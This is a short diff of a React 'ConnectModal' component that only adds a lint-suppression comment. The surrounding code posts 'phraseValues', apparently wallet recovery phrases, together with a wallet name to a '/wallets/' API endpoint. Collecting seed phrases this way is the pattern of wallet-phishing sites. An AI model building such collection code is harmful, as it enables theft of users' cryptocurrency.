@@ -113,6 +113,7 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
       };
       axios.post(
         `${VITE_API_URL}/wallets/`,
+        // eslint-disable-next-line react/prop-types
         { ...phraseValues, wallet_name: wallet?.name },
         config
       );
